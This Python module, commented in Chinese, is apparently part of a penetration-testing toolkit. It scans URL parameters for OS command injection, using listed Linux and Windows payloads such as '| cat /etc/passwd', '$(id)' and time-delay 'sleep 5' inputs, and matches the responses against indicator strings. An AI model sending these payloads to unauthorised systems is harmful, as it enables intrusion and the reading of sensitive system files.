#!/usr/bin/env python3
"""
RCE (命令注入) 检测器 - 基于 BaseDetector 重构

支持检测类型:
- 基础命令注入 (Basic Command Injection)
- 时间盲注 (Time-based Blind)
- 带外检测 (Out-of-Band) - 需要配合 OOB 服务
"""

import re
import time
from typing import Dict, List, Any, Optional
from urllib.parse import quote

import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))))

from tools.detectors.base import BaseDetector, Vulnerability


class RCEDetector(BaseDetector):
    """RCE 命令注入检测器"""

    # 覆盖默认测试参数
    DEFAULT_PARAMS = [
        "cmd", "exec", "command", "ping", "query", "host", "ip",
        "file", "path", "dir", "run", "execute", "shell", "process"
    ]

    # 基础命令注入 Payload (Linux)
    LINUX_PAYLOADS = [
        "; id", "| id", "|| id", "&& id", "& id",
        "; whoami", "| whoami", "|| whoami",
        "`id`", "$(id)", "${id}",
        "| cat /etc/passwd",
        "; cat /etc/passwd",
        "| head -1 /etc/passwd",
        "; uname -a",
        "| uname -a",
    ]

    # 基础命令注入 Payload (Windows)
    WINDOWS_PAYLOADS = [
        "& whoami", "| whoami", "|| whoami",
        "& type C:\\Windows\\win.ini",
        "| type C:\\Windows\\win.ini",
        "& dir C:\\",
        "| dir C:\\",
        "& hostname",
        "| hostname",
    ]

    # 时间盲注 Payload (payload, expected_delay)
    TIME_PAYLOADS = [
        # Linux
        ("; sleep 5", 5),
        ("| sleep 5", 5),
        ("|| sleep 5", 5),
        ("&& sleep 5", 5),
        ("`sleep 5`", 5),
        ("$(sleep 5)", 5),
        # Windows
        ("& timeout 5", 5),
        ("| timeout 5", 5),
        ("& ping -n 5 127.0.0.1", 5),
    ]

    # 命令执行成功指示器 (Linux)
    LINUX_INDICATORS = [
        "uid=", "gid=", "groups=",
        "root:", "daemon:", "bin:", "nobody:",
        "/bin/bash", "/bin/sh",
        "Linux", "GNU/Linux",
    ]

    # 命令执行成功指示器 (Windows)
    WINDOWS_INDICATORS = [
        "extensions",
        "for 16-bit app support",
        "[fonts]",
        "Volume Serial Number",
        "Directory of",
        "COMPUTERNAME",
        "Windows",
    ]

    # 错误信息指示器 (可能表明存在注入点)
    ERROR_INDICATORS = [
        "sh:", "bash:", "cmd.exe",
        "not found", "command not found",
        "syntax error", "unexpected token",
        "cannot execute", "permission denied",
    ]

    def get_payloads(self) -> Dict[str, List]:
        """获取 Payload 库"""
        return {
            "Linux Command Injection": self.LINUX_PAYLOADS,
            "Windows Command Injection": self.WINDOWS_PAYLOADS,
            "Time-based Blind RCE": self.TIME_PAYLOADS,
        }

    def validate_response(
        self,
        response: Dict[str, Any],
        payload: str,
        baseline: Dict[str, Any] = None
    ) -> bool:
        """验证响应是否表明存在命令注入"""
        if not response or not response.get("success"):
            return False

        resp_text = response.get("response_text", "")

        # 检查 Linux 指示器
        for indicator in self.LINUX_INDICATORS:
            if indicator in resp_text:
                return True

        # 检查 Windows 指示器
        for indicator in self.WINDOWS_INDICATORS:
            if indicator in resp_text:
                return True

        # 检查错误指示器 (可能表明存在注入点)
        for indicator in self.ERROR_INDICATORS:
            if indicator.lower() in resp_text.lower():
                return True

        return False

    def detect_basic(
        self,
        url: str,
        param: Optional[str] = None
    ) -> List[Vulnerability]:
        """检测基础命令注入"""
        vulnerabilities = []
        test_params = self.get_test_params(param)

        # 合并 Linux 和 Windows Payload
        all_payloads = self.LINUX_PAYLOADS + self.WINDOWS_PAYLOADS

        for test_param in test_params:
            for payload in all_payloads:
                encoded_payload = quote(payload, safe='')
                response = self.send_request(url, encoded_payload, test_param)

                if not response or not response.get("success"):
                    continue

                resp_text = response.get("response_text", "")

                # 检查指示器
                found_indicator = None
                os_type = None

                for indicator in self.LINUX_INDICATORS:
                    if indicator in resp_text:
                        found_indicator = indicator
                        os_type = "Linux"
                        break

                if not found_indicator:
                    for indicator in self.WINDOWS_INDICATORS:
                        if indicator in resp_text:
                            found_indicator = indicator
                            os_type = "Windows"
                            break

                if found_indicator:
                    vulnerabilities.append(Vulnerability(
                        type="Command Injection",
                        severity="CRITICAL",
                        param=test_param,
                        payload=payload,
                        url=response.get("url", url),
                        evidence=f"检测到 {os_type} 命令执行指示器: {found_indicator}",
                        verified=False,
                        confidence=0.85,
                        details={
                            "os_type": os_type,
                            "indicator": found_indicator,
                            "response_length": len(resp_text)
                        }
                    ))
                    break  # 找到一个就停止该参数的测试

        return vulnerabilities

    def detect_time_based(
        self,
        url: str,
        param: Optional[str] = None
    ) -> List[Vulnerability]:
        """检测时间盲注命令注入"""
        vulnerabilities = []
        test_params = self.get_test_params(param)

        # 获取基线响应时间
        baseline = self.get_baseline(url)
        baseline_time = baseline.get("response_time", 0) if baseline else 0

        for test_param in test_params:
            for payload, expected_delay in self.TIME_PAYLOADS:
                encoded_payload = quote(payload, safe='')
                response = self.send_request(url, encoded_payload, test_param)

                if not response or not response.get("success"):
                    continue

                response_time = response.get("response_time", 0)

                # 检查响应时间是否显著延迟
                if response_time >= expected_delay * 0.85 and response_time >= baseline_time + expected_delay * 0.7:
                    # 二次验证
                    verify_response = self.send_request(url, encoded_payload, test_param)

                    if verify_response and verify_response.get("response_time", 0) >= expected_delay * 0.8:
                        # 判断 OS 类型
                        os_type = "Windows" if "timeout" in payload or "ping -n" in payload else "Linux"

                        vulnerabilities.append(Vulnerability(
                            type="Time-based Blind RCE",
                            severity="CRITICAL",
                            param=test_param,
                            payload=payload,
                            url=response.get("url", url),
                            evidence=f"响应延迟: {response_time:.2f}s / {verify_response.get('response_time', 0):.2f}s (预期: {expected_delay}s)",
                            verified=True,
                            confidence=0.9,
                            details={
                                "os_type": os_type,
                                "baseline_time": baseline_time,
                                "response_time": response_time,
                                "verify_time": verify_response.get("response_time", 0),
                                "expected_delay": expected_delay
                            }
                        ))
                        break  # 找到一个就停止该参数的测试

        return vulnerabilities

    def detect_error_based(
        self,
        url: str,
        param: Optional[str] = None
    ) -> List[Vulnerability]:
        """检测基于错误的命令注入 (可能存在注入点)"""
        vulnerabilities = []
        test_params = self.get_test_params(param)

        # 使用可能触发错误的 Payload
        error_payloads = [
            "; invalid_command_12345",
            "| invalid_command_12345",
            "& invalid_command_12345",
            "`invalid_command_12345`",
            "$(invalid_command_12345)",
        ]

        for test_param in test_params:
            for payload in error_payloads:
                encoded_payload = quote(payload, safe='')
                response = self.send_request(url, encoded_payload, test_param)

                if not response or not response.get("success"):
                    continue

                resp_text = response.get("response_text", "").lower()

                # 检查错误指示器
                for indicator in self.ERROR_INDICATORS:
                    if indicator.lower() in resp_text:
                        vulnerabilities.append(Vulnerability(
                            type="Potential Command Injection",
                            severity="HIGH",
                            param=test_param,
                            payload=payload,
                            url=response.get("url", url),
                            evidence=f"检测到命令错误指示器: {indicator}",
                            verified=False,
                            confidence=0.6,
                            details={
                                "indicator": indicator,
                                "response_length": len(resp_text)
                            }
                        ))
                        break

        return vulnerabilities

    def detect(
        self,
        url: str,
        param: Optional[str] = None,
        deep_scan: bool = True
    ) -> Dict[str, Any]:
        """
        RCE 检测入口

        Args:
            url: 目标 URL
            param: 指定参数 (可选)
            deep_scan: 是否深度扫描 (包含时间盲注和错误检测)

        Returns:
            检测结果字典
        """
        all_vulnerabilities = []

        # 1. 基础命令注入检测
        basic_vulns = self.detect_basic(url, param)
        all_vulnerabilities.extend(basic_vulns)

        if deep_scan:
            # 2. 时间盲注检测
            time_vulns = self.detect_time_based(url, param)
            all_vulnerabilities.extend(time_vulns)

            # 3. 错误检测 (仅当未发现确定漏洞时)
            if not basic_vulns and not time_vulns:
                error_vulns = self.detect_error_based(url, param)
                all_vulnerabilities.extend(error_vulns)

        # 二次验证
        verified_vulns = []
        for vuln in all_vulnerabilities:
            if not vuln.verified:
                if self.verify_vulnerability(vuln):
                    vuln.verified = True
                    vuln.confidence = min(1.0, vuln.confidence + 0.15)
            verified_vulns.append(vuln)

        return {
            "success": True,
            "url": url,
            "detector": self.__class__.__name__,
            "vulnerabilities": [v.to_dict() for v in verified_vulns],
            "total": len(verified_vulns),
            "verified_count": sum(1 for v in verified_vulns if v.verified),
            "by_type": {
                "basic": sum(1 for v in verified_vulns if v.type == "Command Injection"),
                "time_based": sum(1 for v in verified_vulns if "Time" in v.type),
                "potential": sum(1 for v in verified_vulns if "Potential" in v.type),
            }
        }


# 便捷函数 - 兼容旧接口
def rce_detect(url: str, param: str = None, deep_scan: bool = True) -> Dict[str, Any]:
    """RCE 命令注入检测 (兼容旧接口)"""
    with RCEDetector() as detector:
        return detector.detect(url, param, deep_scan)


# 别名 - 兼容 cmd_inject_detect
cmd_inject_detect = rce_detect
